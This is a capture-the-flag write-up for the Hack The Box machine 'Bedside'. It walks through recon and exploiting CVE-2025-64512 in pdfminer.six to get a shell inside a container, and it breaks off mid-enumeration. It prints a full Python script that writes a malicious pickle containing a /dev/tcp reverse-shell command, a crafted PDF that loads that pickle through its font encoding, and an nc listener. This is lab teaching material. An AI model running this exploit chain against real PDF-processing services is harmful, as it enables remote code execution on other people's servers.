# Bedside-HTB
Nmap shows the following info
```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-19 18:24 -0300
Nmap scan report for bedside.htb (10.129.56.155)
Host is up (0.068s latency).

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open     http    Apache httpd 2.4.68
|_http-title: Bedside Clinic - bedside.htb
|_http-server-header: Apache/2.4.68 (Debian)
3000/tcp filtered ppp
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 - 5.14 (96%), Linux 4.15 - 5.19 (96%), HP P2000 G3 NAS device (93%), Linux 2.6.32 - 3.13 (93%), Linux 4.15 (93%), Linux 5.14 - 6.8 (93%), MikroTik RouterOS 6.36 - 6.48 (Linux 3.3.5) (93%), Linux 3.2 - 4.14 (93%), Linux 2.6.32 - 3.10 (93%), Linux 5.0 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   43.16 ms 10.10.16.1
2   85.39 ms bedside.htb (10.129.56.155)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.66 seconds
```
So, there is a port 3000 being filtered, probably open to localhost only, that'll come in hand in the future. The rest is pretty standart, port 80 is hosting a website:
<img width="1287" height="752" alt="image" src="https://github.com/user-attachments/assets/03463685-8847-40df-8a51-1779c7fa2d6f" />

This website is useless, nothing very fancy here. Keep recon going, used ffuf to fuzz for subdomains and found this:
```bash
└─$ ffuf -w ../../../SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -fw 21                  
7
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bedside.htb
 :: Wordlist         : FUZZ: /home/spaz/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.bedside.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 21
________________________________________________

research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 71ms]
```

Good. Now, the subdomain has a way for us to upload files:
<img width="961" height="717" alt="image" src="https://github.com/user-attachments/assets/2b468f36-3796-4c4a-a5be-167239d0d1bc" />

Now let's check the resquest and answer with Burp. But first create a test pdf since que page works with pdfs:
<img width="1917" height="247" alt="image" src="https://github.com/user-attachments/assets/0a7e7f37-aaf4-4936-a763-a869cb278ebf" />

So now, upload this test.pdf and follow it with burp to try and get some info:
<img width="1610" height="885" alt="image" src="https://github.com/user-attachments/assets/1781f981-cc77-44b1-b708-6779972390fe" />

There we found something very used: pdfminer.six. A software name, although not alongside a version. But there is one more thing we can explore here. If we create a text file, but with a mismatched type, such as .pdf we get a very revealing error message:
<img width="1047" height="712" alt="image" src="https://github.com/user-attachments/assets/63180308-c354-47d7-9ab5-df8f1f3f7ae6" />

No we also have access to an absolute PATH where everything is uploaded, it is: "/var/www/research.bedside.htb/uploads". Everything we have uploaded rests at that directory, serverside. Next step is search for vulnerabilities for pdfminer.six. I found CVE-2025-64512 while searching online. It seems that there is a problem when parsing pickle files that are needed during interaction with PDF. So the trick is to generate a malicious pickle file, upload it and then generate a malicious PDF file that point directly to our malicious pickle file. This is only possible because we know the path towards the uploads folder: "/var/www/research.bedside.htb/uploads". There is a complete PoC right here: https://github.com/pdfminer/pdfminer.six/security/advisories/GHSA-wf5f-4jwr-ppcp. First crear a .py file to generate the malicious pickle file:
```python
#!/usr/bin/env python3
import pickle
import gzip

def create_demo_pickle():
    print("Creating demonstration pickle file...")

    # Create payload that executes code AND returns a dict (as pdfminer expects)
    class EvilPayload:
        def __reduce__(self):
            # This function will be called during unpickling
            code = "sh -i >& /dev/tcp/<yourIP>/<yourPort> 0>&1"
            return (eval, (code,))

    demo_cmap_data = EvilPayload()

    # Create the pickle file that the path traversal would access
    target_path = "./malicious.pickle.gz"

    try:
        with gzip.open(target_path, 'wb') as f:
            pickle.dump(demo_cmap_data, f)
        print(f"✓ Created demonstration pickle file: {target_path}")
        return target_path

    except Exception as e:
        print(f"✗ Error creating pickle file: {e}")
        return None

if __name__ == "__main__":
    create_demo_pickle()
```
Just make sure to place your ip and desired port here:
```python
code = "sh -i >& /dev/tcp/<yourIP>/<yourPort> 0>&1"
```
Then, you must execute this script to generate the "malicious.pickle.gz" file:
<img width="1917" height="55" alt="image" src="https://github.com/user-attachments/assets/ee85921d-97cf-496e-84c2-7026f7102da3" />

Then create a .pdf file containing this:
```bash
└─$ cat mal.pdf                                                       
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources
<<
/Font
<<
/F1 5 0 R
>>
>>
>>
endobj

4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Malicious PDF) Tj
ET
endstream
endobj

5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /MaliciousFont-Identity-H
/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fmalicious.pickle.gz
/DescendantFonts [6 0 R]
>>
endobj

6 0 obj
<<
/Type /Font
/Subtype /CIDFontType2
/BaseFont /MaliciousFont
/CIDSystemInfo
<<
/Registry (Adobe)
/Ordering (Identity)
/Supplement 0
>>
/FontDescriptor 7 0 R
>>
endobj

7 0 obj
<<
/Type /FontDescriptor
/FontName /MaliciousFont
/Flags 4
/FontBBox [-1000 -1000 1000 1000]
/ItalicAngle 0
/Ascent 1000
/Descent -200
/CapHeight 800
/StemV 80
>>
endobj

xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000274 00000 n
0000000370 00000 n
0000000503 00000 n
0000000673 00000 n
trailer
<<
/Size 8
/Root 1 0 R
>>
startxref
871
%%EOF
```

Now, start the listener:
```bash
nc -lnvp 4444
````

Following that first upload the pickel file:
<img width="876" height="78" alt="image" src="https://github.com/user-attachments/assets/458358b2-b8ad-409d-826e-672347c2b463" />

The upload the .pdf file:
<img width="888" height="78" alt="image" src="https://github.com/user-attachments/assets/7741981c-1306-4e66-a1c8-65f9560491d9" />

After a few seconds, you're going to recieve the shell back to you:
<img width="1917" height="172" alt="image" src="https://github.com/user-attachments/assets/0d57660c-b585-4533-aa7c-16f8513181ab" />

Clearly we are inside a docker container:
<img width="1915" height="80" alt="image" src="https://github.com/user-attachments/assets/40d0cee7-4644-49f4-9c4a-44d39f9aef57" />

Now we know that the usual ways to see open ports are not available:
<img width="1917" height="122" alt="image" src="https://github.com/user-attachments/assets/d6c245c9-bc6c-4e58-baab-44dfa8a26edb" />

But at /tmp we can find something like a porscanner. So let's use it:










